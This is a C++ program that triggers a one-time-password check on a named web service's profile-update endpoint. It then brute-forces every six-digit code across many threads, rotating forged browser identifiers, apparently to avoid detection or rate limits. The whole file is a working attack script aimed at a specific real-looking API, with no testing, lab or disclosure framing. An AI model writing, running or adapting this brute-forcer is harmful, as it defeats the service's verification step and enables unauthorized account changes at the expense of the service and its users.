#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <sstream>
#include <chrono>
#include <thread>
#include <mutex>

using json = nlohmann::json;
using namespace cpr;
using namespace std;

mutex cout_mutex;

string generate_user_agent() {
    // Vector of common browsers and their versions
    const vector<pair<string, vector<string>>> browsers = {
        {"Chrome", {"91.0.4472.124", "92.0.4515.107", "93.0.4577.63", "94.0.4606.71", "95.0.4638.69"}},
        {"Firefox", {"89.0", "90.0", "91.0", "92.0", "93.0"}},
        {"Safari", {"14.1.1", "14.1.2", "15.0", "15.1", "15.2"}},
        {"Edge", {"91.0.864.59", "92.0.902.67", "93.0.961.52", "94.0.992.47", "95.0.1020.30"}}
    };

    // Vector of common operating systems
    const vector<string> operating_systems = {
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64",
        "Windows NT 6.1; Win64; x64",
        "Macintosh; Intel Mac OS X 10_14_6"
    };

    // Use current time as seed for random generator
    unsigned seed = chrono::system_clock::now().time_since_epoch().count();
    mt19937_64 generator(seed);

    // Randomly select a browser and its version
    uniform_int_distribution<int> browser_dist(0, browsers.size() - 1);
    int browser_index = browser_dist(generator);
    const auto& browser = browsers[browser_index];

    uniform_int_distribution<int> version_dist(0, browser.second.size() - 1);
    int version_index = version_dist(generator);

    // Randomly select an operating system
    uniform_int_distribution<int> os_dist(0, operating_systems.size() - 1);
    int os_index = os_dist(generator);

    // Construct the user agent string
    ostringstream ua_stream;
    ua_stream << "Mozilla/5.0 (" << operating_systems[os_index] << ") ";

    if (browser.first == "Chrome" || browser.first == "Safari" || browser.first == "Edge") {
        ua_stream << "AppleWebKit/537.36 (KHTML, like Gecko) ";
    }

    if (browser.first == "Chrome") {
        ua_stream << "Chrome/" << browser.second[version_index] << " Safari/537.36";
    } else if (browser.first == "Firefox") {
        ua_stream << "Firefox/" << browser.second[version_index];
    } else if (browser.first == "Safari") {
        ua_stream << "Version/" << browser.second[version_index] << " Safari/605.1.15";
    } else if (browser.first == "Edge") {
        ua_stream << "Chrome/" << browser.second[version_index] << " Safari/537.36 Edg/" << browser.second[version_index];
    }

    return ua_stream.str();
}

void attempt_otp_range(int start, int end, const string& new_name, Header headers) {
    for (int i = start; i <= end; ++i) {
        string otp = to_string(i);
        otp.insert(0, 6 - otp.length(), '0'); // Pad with zeros if necessary

        json otp_payload = {
            {"leadname", new_name},
            {"authevent", "NAME_CHANGE"},
            {"authotp", otp}
        };

        headers["sec-ch-ua"] = generate_user_agent();
        auto otp_response = Patch(Url{"https://api.habit.yoga/lead/profileupdate"},
                                  Header{headers},
                                  Body{otp_payload.dump()});

        {
            lock_guard<mutex> lock(cout_mutex);
            cout << otp_response.text << ':' << otp << '\n';
        }

        if (otp_response.status_code == 200) {
            break; // Stop if successful
        }
    }
}

int main(int argc, char** argv) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <token> <new name>" << endl;
        return 1;
    }

    int num_threads; // Or any number you see fit
    const unsigned int recco_threads = thread::hardware_concurrency() * 10;
    cout << "You have " << thread::hardware_concurrency() << " cores available." << endl;
    string num_threads_str;
    cout << "Enter number of threads [default=" << recco_threads << "]: ";
    getline(cin, num_threads_str);
    if (num_threads_str.empty()) {
        num_threads = recco_threads;
    } else {
        num_threads = stoi(num_threads_str);
    }

    const int range_per_thread = 1000000 / num_threads; // Assuming OTPs range from 0 to 999999

    // Extract the token and new name from the command line arguments
    const string TOKEN = argv[1];
    string new_name = argv[2];
    // If there are more than 3 arguments concatenate the rest into the new name
    for (int i = 3; i < argc; i++) {
        new_name += ' ';
        new_name += argv[i];
    }

    Header headers = {
        {"accept", "application/json"},
        {"accept-language", "en-US,en;q=0.9"},
        {"authorization", TOKEN},
        {"cache-control", "no-cache"},
        {"content-type", "application/json"},
        {"pragma", "no-cache"},
        {"priority", "u=1, i"},
        {"sec-ch-ua", generate_user_agent()},
        {"sec-ch-ua-mobile", "?0"},
        {"sec-ch-ua-platform", "\"Windows\""},
        {"sec-fetch-dest", "empty"},
        {"sec-fetch-mode", "cors"},
        {"sec-fetch-site", "same-site"},
        {"Referer", "https://habit.yoga/"},
        {"Referrer-Policy", "strict-origin-when-cross-origin"}
    };

    const json payload = {
        {"leadname", new_name},
        {"authevent", "NAME_CHANGE"}
    };



    const Response r = Patch(Url{"https://api.habit.yoga/lead/profileupdate"},
                                 Header{headers},
                                 Body{payload.dump()});

    cout << r.text << endl;

    vector<thread> threads;

    for (int i = 0; i < num_threads; ++i) {
        int start = i * range_per_thread;
        int end = (i + 1) * range_per_thread - 1;
        if (i == num_threads - 1) {
            end = 999999; // Make sure the last thread covers the rest
        }
        headers["sec-ch-ua"] = generate_user_agent();
        threads.emplace_back(attempt_otp_range, start, end, new_name, headers);
    }

    for (auto& t : threads) {
        t.join();
    }

    return 0;
}